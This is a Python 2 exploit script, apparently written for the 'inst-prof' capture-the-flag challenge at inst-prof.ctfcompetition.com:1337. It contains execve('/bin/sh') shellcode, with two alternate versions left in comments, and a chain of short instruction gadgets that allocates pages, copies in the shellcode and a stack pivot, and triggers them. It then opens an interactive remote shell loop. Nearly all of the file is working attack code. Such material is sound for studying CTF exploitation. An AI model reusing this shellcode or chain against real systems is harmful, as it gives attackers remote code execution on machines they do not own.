import socket
#shellcode = "\x90"*10+"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
#shellcode = "\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"
shellcode = "\x48\x31\xc0\x48\x89\xec\x50\x48\x89\xe2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x52\x48\x89\xe2\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
gadget = "\xc3\x4b\x55\x55\x55\x55\x00\x00\x00\x40\xff\xf7\xff\x7f\x00\x00\x20\x4a\x55\x55\x55\x55\x00\x00\x00\x40\xff\xf7\xff\x7f\x00\x00"

with open("wowzy",'wb') as f:
	# mov r13,[rsp] - save executable address
	f.write("\x4c\x8b\x2c\x24") 

	# dec r13; ret - r13 will contain ptr to page_alloc
	f.write("\x49\xff\xcd\xc3"*296)

	# call r13; ret - call to alloc a page twice
	# one for shellcode (4000) one for gadgets (3000)
	f.write("\x41\xff\xd5\xc3"*2)

	# mov r14, rbx; ret - save the pointer to this page (5000)
	# for later use for make page executable
	f.write("\x49\x89\xDE\xC3")
	
	# dec r14; nop - decrease r14 by 0x1000 to point to shellcode page
	f.write("\x49\xFF\xce\x90")

	# mov r15, r14; ret - save (4000) to r15
	f.write("\x4d\x89\xf7\xc3")

	# dec r15; nop - decrease r15 to point to gadget page (3000)
	f.write("\x49\xFF\xcf\x90")

	# mov byte ptr [r14], {}; inc r14; ret;
	# copy the shellcode string to buffer (4000)
	[f.write("\x41\xc6\x06{}\x49\xFF\xC6\xC3".format(x)) for x in shellcode]
	
	# increase gadget location to have the stack there too
	f.write("\x49\xff\xc7\xc3"*80)

	# mov byte ptr [r15], {}; inc r15; ret;
	# copy the gadget string to buffer (3000)
	[f.write("\x41\xc6\x07{}\x49\xFF\xC7\xC3".format(x)) for x in gadget]

	# dec r14; ret - decrease r14 to point back to beginning of page
	f.write("\x49\xFF\xce\xc3"*len(shellcode))
	# dec r15; ret - decrease r15 to point back to beginning of page
	f.write("\x49\xFF\xcf\xc3"*len(gadget))

	# xchg rsp, r15; - trigger the rop chain
	f.write("\x49\x87\xe7\xc3")

q = open('wowzy','rb').read()
a = socket.socket()
a.connect(('inst-prof.ctfcompetition.com',1337))
print a.recv(1024)
print a.recv(1024)
a.send(q+'\n')
print a.recv(90000000)
while 1:
    a.send(raw_input('>>')+'\n')
    print a.recv(1000000)
